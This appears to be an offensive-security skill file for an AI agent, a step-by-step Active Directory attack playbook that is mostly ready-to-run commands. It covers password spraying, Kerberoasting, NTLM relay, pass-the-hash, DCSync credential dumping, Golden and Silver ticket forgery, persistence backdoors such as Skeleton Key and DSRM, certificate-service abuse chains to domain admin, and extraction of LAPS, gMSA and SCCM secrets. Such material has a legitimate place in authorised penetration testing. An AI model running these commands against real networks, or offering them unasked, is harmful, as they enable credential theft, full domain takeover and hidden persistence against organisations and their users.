---
name: active-directory-attack
description: Active Directory penetration testing — BloodHound enumeration, Kerberos attacks (Kerberoasting, AS-REP, Golden/Silver Ticket), NTLM relay, DCSync, lateral movement, domain dominance
metadata:
  type: offensive
  phase: exploitation
  tools: impacket, mimikatz, bloodhound, rubeus, crackmapexec, powerview, responder, kerbrute
  mitre: TA0008
kill_chain:
  phase: [exploit, actions]
  step: [4, 7]
  attck_tactics: [TA0006, TA0008, TA0004]
depends_on: [network-attack, privesc-windows]
feeds_into: [red-team-ops, advanced-redteam]
inputs: [domain_info, user_context]
outputs: [domain_admin_access, finding_record, credential_dump]
---

# Active Directory Attacks

## When to Activate

- Attacking Windows domain environments
- Kerberos exploitation (Kerberoasting, AS-REP roasting, tickets)
- NTLM relay and lateral movement
- BloodHound enumeration and attack path discovery
- Domain privilege escalation and persistence
- DCSync and credential extraction

## Essential Tools

| Tool | Purpose |
|------|---------|
| BloodHound | AD attack path visualization |
| Impacket | Python AD attack suite |
| Mimikatz | Credential extraction |
| Rubeus | Kerberos attacks |
| CrackMapExec | Network exploitation |
| PowerView | AD enumeration |
| Responder | LLMNR/NBT-NS poisoning |
| Kerbrute | User enumeration & password spray |

## Core Workflow

### Step 1: Kerberos Clock Sync

Kerberos requires ±5 minutes clock synchronization:

```bash
# Detect clock skew
nmap -sT 10.10.10.10 -p445 --script smb2-time

# Fix clock on Linux
sudo date -s "14 APR 2026 18:25:16"

# Fix clock on Windows
net time /domain /set

# Fake clock without changing system time
faketime -f '+8h' <command>
```

### Step 2: AD Reconnaissance with BloodHound

```bash
# Start BloodHound
neo4j console
bloodhound --no-sandbox

# Collect data with SharpHound (Windows)
.\SharpHound.exe -c All
.\SharpHound.exe -c All --ldapusername user --ldappassword pass

# Python collector (Linux)
bloodhound-python -u 'user' -p 'password' -d domain.local -ns 10.10.10.10 -c all
```

### Step 3: PowerView Enumeration

```powershell
# Domain info
Get-NetDomain
Get-DomainSID
Get-NetDomainController

# User enumeration
Get-NetUser
Get-NetUser -SamAccountName targetuser
Get-UserProperty -Properties pwdlastset

# Group enumeration
Get-NetGroupMember -GroupName "Domain Admins"
Get-DomainGroup -Identity "Domain Admins" | Select-Object -ExpandProperty Member

# Find local admin access
Find-LocalAdminAccess -Verbose
Invoke-UserHunter
Invoke-UserHunter -Stealth
```

## Credential Attacks

### Password Spraying

```bash
# Kerbrute
./kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt Password123

# CrackMapExec
crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123' --continue-on-success
```

### Kerberoasting

```bash
# Find SPNs
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10

# Request TGS tickets
GetUserSPNs.py domain.local/user:password -dc-ip 10.10.10.10 -request -outputfile tgs.txt

# Crack tickets
hashcat -m 13100 tgs.txt rockyou.txt
# Or: john --wordlist=rockyou.txt --format=krb5tgs tgs.txt

# Rubeus (Windows)
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /outfile:hashes.txt /creduser:DOMAIN\user /credpassword:pass
```

### AS-REP Roasting (No Pre-Auth Required)

```bash
# Find users with DONT_REQ_PREAUTH
Get-DomainUser -PreauthNotRequired
# Or BloodHound: MATCH (u:User {dontreqpreauth:true}) RETURN u

# Request AS-REP
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -dc-ip 10.10.10.10 -no-pass

# Crack
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Rubeus
Rubeus.exe asreproast /outfile:asrep.txt
```

## NTLM Relay Attacks

### Responder (LLMNR/NBT-NS Poisoning)

```bash
responder -I eth0 -wrf

# With WPAD poisoning
responder -I eth0 -A

# Analyze captured hashes
python3 /opt/Responder/tools/RunFinger.py -i 10.10.10.0/24
```

### NTLM Relay to SMB/LDAP

```bash
# Relay to SMB (requires SMB signing disabled)
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (create computer account + RBCD)
ntlmrelayx.py -t ldaps://dc.domain.local --delegate-access

# Relay to AD CS (ESC8)
ntlmrelayx.py -t http://adcs.domain.local/certsrv/certfnsh.asp -smb2support
```

### SMB Signing Check

```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list relayable.txt
# Or check individually:
nmap -p445 --script smb-security-mode 10.10.10.10
```

## Lateral Movement

### Pass-the-Hash

```bash
# CrackMapExec
crackmapexec smb 10.10.10.10 -u user -H aad3b435b51404eeaad3b435b51404ee:NTLM_HASH -x "whoami"

# Impacket
psexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
wmiexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
smbexec.py -hashes :NTLM_HASH domain.local/user@10.10.10.10
```

### Pass-the-Ticket

```bash
# Export ticket (Rubeus)
Rubeus.exe dump /nowrap
# Or: Rubeus.exe triage

# Convert to Kirbi (if needed)
Rubeus.exe ticket /ticket:base64string

# Pass ticket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py domain.local/user@10.10.10.10 -k -no-pass
```

### DCSync (Domain Replication)

```bash
# Requires: Replicating Directory Changes rights
impacket-secretsdump -just-dc domain.local/user:password@10.10.10.10

# Mimikatz
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator

# CrackMapExec
crackmapexec smb 10.10.10.10 -u user -p password --ntds drsuapi
```

## Kerberos Ticket Attacks

### Golden Ticket (KRBTGT Hash)

```bash
# Requires: KRBTGT NTLM hash + Domain SID
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:HASH /ptt

# Rubeus
Rubeus.exe golden /rc4:HASH /user:Administrator /domain:domain.local /sid:S-1-5-21-xxx /ptt

# Impacket
ticketer.py -nthash HASH -domain-sid SID -domain domain.local Administrator
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass domain.local/Administrator@DC_IP
```

### Silver Ticket (Service Account Hash)

```bash
# Requires: Service account NTLM hash + SPN
mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /target:server.domain.local /service:cifs /rc4:HASH /user:Administrator /ptt

# Access target service
dir \\server.domain.local\c$
```

### Diamond Ticket (Forged TGT)

```bash
# Forged ticket that looks legitimate (includes real PAC)
Rubeus.exe diamond /rc4:HASH /user:Administrator /domain:domain.local /sids:S-1-5-21-xxx-512 /ptt
```

### Sapphire Ticket

```bash
# Similar to Diamond but with more realistic PAC structure
Rubeus.exe sapphire /rc4:HASH /user:Administrator /domain:domain.local /sids:S-1-5-21-xxx-512 /ptt
```

## Persistence Mechanisms

### Skeleton Key

```bash
mimikatz # privilege::debug
mimikatz # misc::skeleton
# Now any user can authenticate with "mimikatz" as password
```

### AdminSDHolder

```powershell
# Modify AdminSDHolder ACL (persists across DA changes)
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity attacker -Rights All
```

### DSRM Backdoor

```powershell
# Dump DSRM hash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'

# Enable DSRM admin logon
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name DsrmAdminLogonBehavior -Value 2

# Pass DSRM hash
psexec.py -hashes :DSRM_HASH domain.local/Administrator@DC_IP
```

### DCShadow

```bash
# Requires: DA + Schema Admin rights
# Register rogue DC
lsadump::dcshadow /object:targetUser /attribute:userAccountControl /value=512

# Push changes
lsadump::dcshadow /push
```

## OPSEC Considerations

**Must Not:**
- Lock out accounts with excessive password spraying
- Modify production AD objects without approval
- Leave Golden Tickets without documentation

**Should:**
- Run BloodHound for attack path discovery
- Check SMB signing before relay attacks
- Verify patch levels for CVE exploitation

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Clock skew too great | Sync time with DC or use faketime |
| Kerberoasting returns empty | No service accounts with SPNs |
| DCSync access denied | Need Replicating Directory Changes rights |
| NTLM relay fails | Check SMB signing, try LDAP target |
| BloodHound empty | Verify collector ran with correct creds |

## Advanced: ADCS (Active Directory Certificate Services)

### ESC1 — Enrollee Supplies Subject (SAN)
```bash
# Find vulnerable templates
certipy find -u user@domain -p pass -dc-ip DC_IP -vulnerable -stdout

# Request cert with arbitrary UPN (impersonate admin)
certipy req -u user@domain -p pass -ca CA-NAME -template VulnTemplate \
  -upn administrator@domain -dns dc01.domain.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

### ESC4 — Template ACL Abuse
```bash
# Modify template to make it vulnerable to ESC1
certipy template -u user@domain -p pass -template VulnTemplate -save-old
# Template now allows enrollee to supply SAN → chain to ESC1

# Restore original template after exploitation
certipy template -u user@domain -p pass -template VulnTemplate -configuration VulnTemplate.json
```

### ESC8 — NTLM Relay to HTTP Enrollment
```bash
# Relay coerced NTLM auth to ADCS HTTP enrollment endpoint
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Coerce DC authentication
python3 PetitPotam.py -d domain -u user -p pass RELAY_IP DC_IP

# Authenticate with obtained certificate
certipy auth -pfx dc01.pfx -dc-ip DC_IP
```

### ESC11 — Certificate Mapping (StrongCertificateBindingEnforcement=0)
```bash
# When certificate mapping is weak, ANY cert with matching UPN works
# Combined with ESC1: request cert for any user, even if template is
# not originally vulnerable, weak mapping accepts it
```

### ESC13 — Issuance Policy OID Group Link
```bash
# Abuse issuance policy linked to universal group
# Enroll in template with policy → automatically added to linked group
# If linked group has privileged access → instant escalation
certipy req -u user@domain -p pass -ca CA-NAME -template PolicyTemplate
```

## Advanced: Shadow Credentials & Key Trust

### msDS-KeyCredentialLink Abuse
```bash
# Requires GenericWrite over target (user or computer)
# Add shadow credential (Key Trust)
python3 pywhisker.py -d domain -u attacker -p pass --target victim --action add

# Windows
whisker.exe add /target:dc01$ /domain:domain.local /dc:dc01.domain.local

# Get TGT with certificate
certipy auth -pfx shadow_cred.pfx -dc-ip DC_IP

# UnPAC-the-hash: get NT hash from TGT
certipy auth -pfx shadow_cred.pfx -dc-ip DC_IP -get-hash
```

## Advanced: Kerberos Delegation Abuse

### Resource-Based Constrained Delegation (RBCD)
```bash
# Requirements: GenericWrite on target + ability to create machine account
# Step 1: Create machine account
impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'P@ss' \
  -dc-ip DC_IP domain/user:pass

# Step 2: Set RBCD on target
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
  -dc-ip DC_IP domain/user:pass

# Step 3: S4U2Self + S4U2Proxy → impersonate admin
impacket-getST -spn cifs/target.domain -impersonate administrator \
  -dc-ip DC_IP domain/'EVIL$':'P@ss'

export KRB5CCNAME=administrator@cifs_target.domain@DOMAIN.ccache
impacket-smbexec -k -no-pass target.domain
```

### Constrained Delegation with Protocol Transition
```bash
# S4U2Self → S4U2Proxy for service with TrustedToAuthForDelegation
Rubeus.exe s4u /user:svc_sql /rc4:HASH /impersonateuser:administrator \
  /msdsspn:cifs/target /ptt

# Alternative service name abuse (SPN is not validated in S4U2Proxy)
Rubeus.exe s4u /user:svc_web /aes256:KEY /impersonateuser:admin \
  /msdsspn:http/target /altservice:cifs,ldap,host,mssql /ptt
```

## Advanced: Trust Attacks

### SID History Injection (Cross-Forest)
```bash
# Get trust key
mimikatz# lsadump::trust /patch

# Forge inter-realm TGT with Enterprise Admins SID in SID History
mimikatz# kerberos::golden /user:admin /domain:child.corp.local \
  /sid:S-1-5-21-CHILD-DOMAIN /krbtgt:TRUST_KEY \
  /sids:S-1-5-21-PARENT-DOMAIN-519 /service:krbtgt /target:corp.local /ptt

# Access parent domain resources
dir \\parent-dc.corp.local\c$
```

### PAM Trust Exploitation
```bash
# Bastion forest with PAM trust
# DACL abuse on foreign security principals
# Shadow principal with SID mapping to production DA

# Enumerate trust relationships
Get-ADTrust -Filter * | Select Name, Direction, TrustType, ForestTransitive
```

## Advanced: Coercion Attacks (2024-2026)

### PetitPotam (MS-EFSRPC)
```bash
python3 PetitPotam.py -d domain -u user -p pass LISTENER_IP TARGET_IP
# Coerces TARGET to authenticate to LISTENER via NTLM
```

### DFSCoerce (MS-DFSNM)
```bash
python3 DFSCoerce.py -d domain -u user -p pass LISTENER_IP TARGET_IP
```

### PrinterBug / SpoolSample (MS-RPRN)
```bash
python3 printerbug.py domain/user:pass@TARGET_IP LISTENER_IP
```

### ShadowCoerce (MS-FSRVP)
```bash
python3 shadowcoerce.py -d domain -u user -p pass LISTENER_IP TARGET_IP
```

### Coercion → Relay → Domain Admin Chain
```bash
# Full chain: Coerce DC → NTLM Relay → ADCS ESC8 → DA
# Terminal 1: NTLM relay to ADCS
ntlmrelayx.py -t http://ca/certsrv/certfnsh.asp -smb2support \
  --adcs --template DomainController

# Terminal 2: Coerce DC
python3 PetitPotam.py RELAY_IP DC_IP

# Terminal 3: Authenticate with captured certificate
certipy auth -pfx dc01.pfx -dc-ip DC_IP
# → NT hash of DC machine account → DCSync → Domain Admin
```

## Advanced: LAPS & gMSA Exploitation

### LAPS Password Reading
```bash
# LAPS v1 (ms-Mcs-AdmPwd) — requires read access to attribute
crackmapexec ldap DC_IP -u user -p pass -M laps

# LAPS v2 (msLAPS-Password) — encrypted, requires specific permissions
# Decrypt with user who has decryption rights

# Python
from ldap3 import *
s = Server('DC_IP', get_info=ALL)
c = Connection(s, user='domain\\user', password='pass', auto_bind=True)
c.search('DC=domain,DC=local', '(ms-Mcs-AdmPwd=*)', attributes=['ms-Mcs-AdmPwd','sAMAccountName'])
for entry in c.entries:
    print(f"{entry.sAMAccountName}: {entry['ms-Mcs-AdmPwd']}")
```

### gMSA Password Extraction
```bash
# Requires membership in PrincipalsAllowedToRetrieveManagedPassword
python3 gMSADumper.py -u user -p pass -d domain.local

# With impacket
impacket-ntlmrelayx --dump-gmsa

# LAPS persistence — set expiration to far future
Set-DomainObject -Identity TARGET$ \
  -Set @{'ms-Mcs-AdmPwdExpirationTime'='132982560000000000'}
```

## Advanced: SCCM/MECM Exploitation

### Site Server Takeover
```bash
# SCCM hierarchy takeover via NTLM relay
# Coerce SCCM primary site → relay to MSSQL → admin on SCCM

# SharpSCCM for post-exploitation
SharpSCCM.exe local secrets -m wmi
SharpSCCM.exe get secrets

# Extract NAA (Network Access Account) credentials
SharpSCCM.exe get naa
```

### PXE Boot Exploitation
```bash
# Capture PXE boot media → extract credentials
# Variables stored in policy include admin passwords
python3 pxethief.py 2
# Decrypt using media certificate from SCCM
```
